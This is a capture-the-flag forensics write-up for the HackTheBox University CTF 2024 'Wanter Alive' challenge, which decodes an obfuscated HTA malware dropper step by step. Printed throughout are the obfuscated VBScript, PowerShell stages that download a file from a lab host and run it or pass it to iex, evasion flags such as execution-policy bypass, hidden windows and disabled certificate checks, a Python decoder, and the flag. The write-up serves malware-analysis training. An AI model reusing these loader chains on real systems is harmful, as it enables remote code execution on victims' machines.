---
title: "Wanter Alive"
description: "A routine patrol through the Frontier Cluster's shadowy corners uncovered a sinister file embedded in a bounty report—one targeting Jack Colt himself. The file’s obfuscated layers suggest it's more than a simple message; it’s a weaponized codNote: Ensure all domains discovered in the challenge resolve to your Docker instance, including the appropriate port when accessing URLs.e from the Frontier Board, aiming to tighten their grip on the stars. As a trusted ally, it's your task to peel back the layers of deception trace its origin, and turn their tools against them. Every domain found in the challenge should resolve to your docker instance. Do not forget to add the port when visiting the URLs."
pubDate: 2024-12-17
ctf: "HackTheBox University CTF 2024"
category: "forensics"
author: "sealldev"
section: "CTFs"
image: "images/24-htbuni/icon.png"
---



We are given a remote and an obfuscated `HTA` file.

It was URL encoded several times, upon finishing decoding it we get some Visual Basic Script:
```
<!DOCTYPE html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
<html>
<body>
<sCrIPT lANgUAge="VbScRipT">
DiM                                                                                                                                                                                                                                                                                                                            OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF                                                                                                                                                                                                                                                                                                                            ,                                                                                                                                                                                                                                                                                                                            PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM                                                                                                                                                                                                                                                                                                                            :                                                                                                                                                                                                                                                                                                                            set                                                                                                                                                                                                                                                                                                                            OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF                                                                                                                                                                                                                                                                                                                            =                                                                                                                                                                                                                                                                                                                            createoBjEct                                                                                                                                                                                                                                                                                                                            (                                                                                                                                                                                                                                                                                                                            Chr(&H57)                                                                                                                                                                                                                                                                                                                            &                                                                                                                                                                                                                                                                                                                            "SCRIPT.shELL"                                                                                                                                                                                                                                                                                                                            )                                                                                                                                                                                                                                                                                                                            :                                                                                                                                                                                                                                                                                                                            PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM                                                                                                                                                                                                                                                                                                                            =                                                                                                                                                                                                                                                                                                                            "PowErShEll                                 -Ex                                 BYPaSS                                 -NOP                                 -W                                 1                                 -C                                 dEVIcEcrEDEnTIAlDePlOYmENt.EXe                                 ;                                 iex($(iEX('[SYsTeM.TeXt.EnCoding]' [chAr]0X3A [CHAr]0X3A 'uTf8.geTSTring([SYstem.ConVERT]' [chAR]58 [CHAR]58 'fRoMBASE64string(' [CHar]0X22 'JGVhNmM4bXJUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1UeXBlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW1lTUJlckRlZmluSVRJb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnW0RsbEltcG9ydCgidVJMbU9OLmRsTCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFVSTERvd25sb2FkVG9GaWxlKEludFB0ciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBHLHN0cmluZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENmbXIsc3RyaW5nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYVV2eVZCUkQsdWludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZmWWxEb2wsSW50UHRyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb0ZYckloKTsnICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW5BTUUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiU3V4dFBJQkp4bCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtTmFtRXNQQWNFICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbklZcCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1QYXNzVGhydTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZWE2YzhtclQ6OlVSTERvd25sb2FkVG9GaWxlKDAsImh0dHA6Ly93YW50ZWQuYWxpdmUuaHRiLzM1L3dhbnRlZC50SUYiLCIkZU52OkFQUERBVEFcd2FudGVkLnZicyIsMCwwKTtTVEFSdC1zbGVlUCgzKTtzdEFSdCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkZW5WOkFQUERBVEFcd2FudGVkLnZicyI=' [cHar]0X22 '))')))"                                                                                                                                                                                                                                                                                                                            :                                                                                                                                                                                                                                                                                                                            OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.rUN                                                                                                                                                                                                                                                                                                                            chR                                                                                                                                                                                                                                                                                                                            (                                                                                                                                                                                                                                                                                                                            34                                                                                                                                                                                                                                                                                                                            )                                                                                                                                                                                                                                                                                                                            &                                                                                                                                                                                                                                                                                                                            OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.eXpanDEnVIroNMENtSTRinGs(                                                                                                                                                                                                                                                                                                                            Chr(&H25) & ChrW(&H53) & Chr(&H79) & ChrW(&H73) & ChrW(&H54) & ChrW(&H65) & ChrW(&H6D) & Chr(&H52) & ChrW(&H4F) & Chr(&H6F) & ChrW(&H74) & ChrW(&H25)                                                                                                                                                                                                                                                                                                                            )                                                                                                                                                                                                                                                                                                                            &                                                                                                                                                                                                                                                                                                                            "\SYStEM32\WINdOwSpoweRSheLL\V1.0\PoWERshElL.ExE"                                                                                                                                                                                                                                                                                                                            &                                                                                                                                                                                                                                                                                                                            chr                                                                                                                                                                                                                                                                                                                            (                                                                                                                                                                                                                                                                                                                            34                                                                                                                                                                                                                                                                                                                            )                                                                                                                                                                                                                                                                                                                            &                                                                                                                                                                                                                                                                                                                            cHR                                                                                                                                                                                                                                                                                                                            (                                                                                                                                                                                                                                                                                                                            32                                                                                                                                                                                                                                                                                                                            )                                                                                                                                                                                                                                                                                                                            &                                                                                                                                                                                                                                                                                                                            Chr                                                                                                                                                                                                                                                                                                                            (                                                                                                                                                                                                                                                                                                                            34                                                                                                                                                                                                                                                                                                                            )                                                                                                                                                                                                                                                                                                                            &                                                                                                                                                                                                                                                                                                                            PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM                                                                                                                                                                                                                                                                                                                            &                                                                                                                                                                                                                                                                                                                            CHr                                                                                                                                                                                                                                                                                                                            (                                                                                                                                                                                                                                                                                                                            34                                                                                                                                                                                                                                                                                                                            )                                                                                                                                                                                                                                                                                                                            ,                                                                                                                                                                                                                                                                                                                            0                                                                                                                                                                                                                                                                                                                            :                                                                                                                                                                                                                                                                                                                            SET                                                                                                                                                                                                                                                                                                                            OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF                                                                                                                                                                                                                                                                                                                            =                                                                                                                                                                                                                                                                                                                            NOThING
SeLF.CloSE
</script>

</body>
</html>
```

The script by itself with the spaces shrunk:
```vb
DiM OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF , PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM : set OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF = createoBjEct ( Chr(&H57) & "SCRIPT.shELL" ) : PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM = "PowErShEll -Ex BYPaSS -NOP -W 1 -C dEVIcEcrEDEnTIAlDePlOYmENt.EXe ; iex($(iEX('[SYsTeM.TeXt.EnCoding]' [chAr]0X3A [CHAr]0X3A 'uTf8.geTSTring([SYstem.ConVERT]' [chAR]58 [CHAR]58 'fRoMBASE64string(' [CHar]0X22 'JGVhNmM4bXJUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFkZC1UeXBlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW1lTUJlckRlZmluSVRJb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnW0RsbEltcG9ydCgidVJMbU9OLmRsTCIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFVSTERvd25sb2FkVG9GaWxlKEludFB0ciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBHLHN0cmluZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENmbXIsc3RyaW5nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYVV2eVZCUkQsdWludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZmWWxEb2wsSW50UHRyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb0ZYckloKTsnICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLW5BTUUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiU3V4dFBJQkp4bCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtTmFtRXNQQWNFICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbklZcCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1QYXNzVGhydTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZWE2YzhtclQ6OlVSTERvd25sb2FkVG9GaWxlKDAsImh0dHA6Ly93YW50ZWQuYWxpdmUuaHRiLzM1L3dhbnRlZC50SUYiLCIkZU52OkFQUERBVEFcd2FudGVkLnZicyIsMCwwKTtTVEFSdC1zbGVlUCgzKTtzdEFSdCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkZW5WOkFQUERBVEFcd2FudGVkLnZicyI=' [cHar]0X22 '))')))" : OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.rUN chR ( 34 ) & OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF.eXpanDEnVIroNMENtSTRinGs( Chr(&H25) & ChrW(&H53) & Chr(&H79) & ChrW(&H73) & ChrW(&H54) & ChrW(&H65) & ChrW(&H6D) & Chr(&H52) & ChrW(&H4F) & Chr(&H6F) & ChrW(&H74) & ChrW(&H25) ) & "\SYStEM32\WINdOwSpoweRSheLL\V1.0\PoWERshElL.ExE" & chr ( 34 ) & cHR ( 32 ) & Chr ( 34 ) & PoRkkqjVbkMUvpXeCSCGmsOdJUQlGcAUJUngSiqyuVjPViqbHZeseLYFNCcVukIEhbtljkiiGoWeAZgVghNVJcDhcTBgSDyFQLePsWgOtrScsnNAJtyDlRZAjVhhhHpMuZogCVFdqfUXGCHHWJhGRHGwRIRmwaFPATUzTJaRdFWdyskcEhJsKYUMGjyLSiMARuQhBMMSrUUKbmPBmNYbWukinAYRFHhKaFYvIHlVM & CHr ( 34 ) , 0 : SET OCpyLSiQittipCvMVdYVbYNgMXDJyXvZlVidpZmjkOIRLVpYuWvvdptBSONolYytwkxIhCnXqimStUHeBdpRBGlAwuMJRJNqkfjiBKOAqjigAGZyghHgJhPzozEPElPmonvxOEqnXAwCwnTBVPziQXITiKqAMMhBzrhygtuGbOfcwXPJLJSTlnsdTKXMGvpGFYvfTmDaqIlzNTqpqzPhhktykgBvytPUtQnnpprPF = NOThING SeLF.CloSE
```

Taking the `PowErShEll` script portion, we can decode the base64:
```powershell
$ea6c8mrT                                 =                                 Add-Type                                 -meMBerDefinITIon                                 '[DllImport("uRLmON.dlL",                                 CharSet = CharSet.Unicode)]public static extern IntPtr URLDownloadToFile(IntPtr                                 PG,string                                 Cfmr,string                                 aUvyVBRD,uint                                 ffYlDol,IntPtr                                 oFXrIh);'                                 -nAME                                 "SuxtPIBJxl"                                 -NamEsPAcE                                 nIYp                                 -PassThru;                                 $ea6c8mrT::URLDownloadToFile(0,"http://wanted.alive.htb/35/wanted.tIF","$eNv:APPDATA\wanted.vbs",0,0);STARt-sleeP(3);stARt                                 "$enV:APPDATA\wanted.vbs"
```

We have a url: `http://wanted.alive.htb/35/wanted.tIF`, downloading that from remote it contains a lot of code but some more Visual Basic of interest:
```vb
private function ReadStdIn()
    while Not stdIn.AtEndOfStream
        ReadStdIn = ReadStdIn & stdIn.ReadAll
    wend
end function


If Not mesor() Then
        
        On Error Resume Next

        latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe"
        latifoliado = latifoliado & "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl"
        latifoliado = latifoliado & "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc"
        latifoliado = latifoliado & "CcpKSkpd2FudGVkCgd2FudGVkCg"
        
        Dim parrana
        parrana = "d2FudGVkCg"

        Dim arran
        arran =" d2FudGVkCg  d2FudGVkCg "
        arran = arran & "$d2FudGVkCgCod2FudGVkCgd"
        arran = arran & "id2FudGVkCggod2FudGVkCg "
        arran = arran & "d2FudGVkCg" & latifoliado & "d2FudGVkCg"
        arran = arran & "$d2FudGVkCgOWd2FudGVkCgj"
        arran = arran & "ud2FudGVkCgxdd2FudGVkCg "
        arran = arran & "=d2FudGVkCg [d2FudGVkCgs"
        arran = arran & "yd2FudGVkCgstd2FudGVkCge"
        arran = arran & "md2FudGVkCg.Td2FudGVkCge"
        arran = arran & "xd2FudGVkCgt.d2FudGVkCge"
        arran = arran & "nd2FudGVkCgcod2FudGVkCgd"
        arran = arran & "id2FudGVkCgngd2FudGVkCg]"
        arran = arran & ":d2FudGVkCg:Ud2FudGVkCgT"
        arran = arran & "Fd2FudGVkCg8.d2FudGVkCgG"
        arran = arran & "ed2FudGVkCgtSd2FudGVkCgt"
        arran = arran & "rd2FudGVkCgind2FudGVkCgg"
        arran = arran & "(d2FudGVkCg[sd2FudGVkCgy"
        arran = arran & "sd2FudGVkCgted2FudGVkCgm"
        arran = arran & ".d2FudGVkCgCod2FudGVkCgn"
        arran = arran & "vd2FudGVkCgerd2FudGVkCgt"
        arran = arran & "]d2FudGVkCg::d2FudGVkCgF"
        arran = arran & "rd2FudGVkCgomd2FudGVkCgb"
        arran = arran & "ad2FudGVkCgsed2FudGVkCg6"
        arran = arran & "4d2FudGVkCgStd2FudGVkCgr"
        arran = arran & "id2FudGVkCgngd2FudGVkCg("
        arran = arran & "$d2FudGVkCgcod2FudGVkCgd"
        arran = arran & "id2FudGVkCggod2FudGVkCg)"
        arran = arran & ")d2FudGVkCg;pd2FudGVkCgo"
        arran = arran & "wd2FudGVkCgerd2FudGVkCgs"
        arran = arran & "hd2FudGVkCgeld2FudGVkCgl"
        arran = arran & ".d2FudGVkCgexd2FudGVkCge"
        arran = arran & " d2FudGVkCg-wd2FudGVkCgi"
        arran = arran & "nd2FudGVkCgdod2FudGVkCgw"
        arran = arran & "sd2FudGVkCgtyd2FudGVkCgl"
        arran = arran & "ed2FudGVkCg hd2FudGVkCgi"
        arran = arran & "dd2FudGVkCgded2FudGVkCgn"
        arran = arran & " d2FudGVkCg-ed2FudGVkCgx"
        arran = arran & "ed2FudGVkCgcud2FudGVkCgt"
        arran = arran & "id2FudGVkCgond2FudGVkCgp"
        arran = arran & "od2FudGVkCglid2FudGVkCgc"
        arran = arran & "yd2FudGVkCg bd2FudGVkCgy"
        arran = arran & "pd2FudGVkCgasd2FudGVkCgs"
        arran = arran & " d2FudGVkCg-Nd2FudGVkCgo"
        arran = arran & "Pd2FudGVkCgrod2FudGVkCgf"
        arran = arran & "id2FudGVkCgled2FudGVkCg "
        arran = arran & "-d2FudGVkCgcod2FudGVkCgm"
        arran = arran & "md2FudGVkCgand2FudGVkCgd"
        arran = arran & " d2FudGVkCg$Od2FudGVkCgW"
        arran = arran & "jd2FudGVkCguxd2FudGVkCgD"
        arran = descortinar(arran, parrana, "")
            
        Dim sandareso
        sandareso = "pd2FudGVkCgo"
        sandareso = sandareso & "wd2FudGVkCgr"
        sandareso = sandareso & "sd2FudGVkCge"
        sandareso = sandareso & "ld2FudGVkCgl -cd2FudGVkCgommad2FudGVkCgnd "
        sandareso = descortinar(sandareso, parrana, "")

        sandareso = sandareso & arran

        Dim incentiva
        Set incentiva = CreateObject("WScript.Shell")
        incentiva.Run sandareso, 0, False 
        WScript.Quit(rumbo)
            
End If
```

Replicating in Python we can decode what's going on:

```python
import re

latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgycCcpKSkpd2FudGVkCgd2FudGVkCg"

parrana = "d2FudGVkCg"

arran = " d2FudGVkCg  d2FudGVkCg $d2FudGVkCgCod2FudGVkCgdid2FudGVkCggod2FudGVkCg d2FudGVkCg"

arran += latifoliado + "d2FudGVkCg"


arran_block = '''
arran = arran & "$d2FudGVkCgOWd2FudGVkCgj"
arran = arran & "ud2FudGVkCgxdd2FudGVkCg "
arran = arran & "=d2FudGVkCg [d2FudGVkCgs"
arran = arran & "yd2FudGVkCgstd2FudGVkCge"
arran = arran & "md2FudGVkCg.Td2FudGVkCge"
arran = arran & "xd2FudGVkCgt.d2FudGVkCge"
arran = arran & "nd2FudGVkCgcod2FudGVkCgd"
arran = arran & "id2FudGVkCgngd2FudGVkCg]"
arran = arran & ":d2FudGVkCg:Ud2FudGVkCgT"
arran = arran & "Fd2FudGVkCg8.d2FudGVkCgG"
arran = arran & "ed2FudGVkCgtSd2FudGVkCgt"
arran = arran & "rd2FudGVkCgind2FudGVkCgg"
arran = arran & "(d2FudGVkCg[sd2FudGVkCgy"
arran = arran & "sd2FudGVkCgted2FudGVkCgm"
arran = arran & ".d2FudGVkCgCod2FudGVkCgn"
arran = arran & "vd2FudGVkCgerd2FudGVkCgt"
arran = arran & "]d2FudGVkCg::d2FudGVkCgF"
arran = arran & "rd2FudGVkCgomd2FudGVkCgb"
arran = arran & "ad2FudGVkCgsed2FudGVkCg6"
arran = arran & "4d2FudGVkCgStd2FudGVkCgr"
arran = arran & "id2FudGVkCgngd2FudGVkCg("
arran = arran & "$d2FudGVkCgcod2FudGVkCgd"
arran = arran & "id2FudGVkCggod2FudGVkCg)"
arran = arran & ")d2FudGVkCg;pd2FudGVkCgo"
arran = arran & "wd2FudGVkCgerd2FudGVkCgs"
arran = arran & "hd2FudGVkCgeld2FudGVkCgl"
arran = arran & ".d2FudGVkCgexd2FudGVkCge"
arran = arran & " d2FudGVkCg-wd2FudGVkCgi"
arran = arran & "nd2FudGVkCgdod2FudGVkCgw"
arran = arran & "sd2FudGVkCgtyd2FudGVkCgl"
arran = arran & "ed2FudGVkCg hd2FudGVkCgi"
arran = arran & "dd2FudGVkCgded2FudGVkCgn"
arran = arran & " d2FudGVkCg-ed2FudGVkCgx"
arran = arran & "ed2FudGVkCgcud2FudGVkCgt"
arran = arran & "id2FudGVkCgond2FudGVkCgp"
arran = arran & "od2FudGVkCglid2FudGVkCgc"
arran = arran & "yd2FudGVkCg bd2FudGVkCgy"
arran = arran & "pd2FudGVkCgasd2FudGVkCgs"
arran = arran & " d2FudGVkCg-Nd2FudGVkCgo"
arran = arran & "Pd2FudGVkCgrod2FudGVkCgf"
arran = arran & "id2FudGVkCgled2FudGVkCg "
arran = arran & "-d2FudGVkCgcod2FudGVkCgm"
arran = arran & "md2FudGVkCgand2FudGVkCgd"
arran = arran & " d2FudGVkCg$Od2FudGVkCgW"
arran = arran & "jd2FudGVkCguxd2FudGVkCgD"
'''

arran_match = re.findall(r'(".*")', arran_block)
arran += "".join([x.replace('"', "") for x in arran_match])

arran = arran.replace(parrana, "")

sandareso = "pd2FudGVkCgowd2FudGVkCgrsd2FudGVkCgeld2FudGVkCgl -cd2FudGVkCgommad2FudGVkCgnd "
sandareso = sandareso.replace(parrana, "")

print(sandareso + arran)
```

Decoded:
```
powrsell -command     $Codigo U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19ycCcpKSkp$OWjuxd = [system.Text.encoding]::UTF8.GetString([system.Convert]::Frombase64String($codigo));powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD
```

The Base64 string decodes to:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('http://wanted.alive.htb/cdba/_rp'))))
```

The `/cdba_rp` has the flag.

Flag: `HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_51331e0c6836e279eb395bb4c34dbe1e}`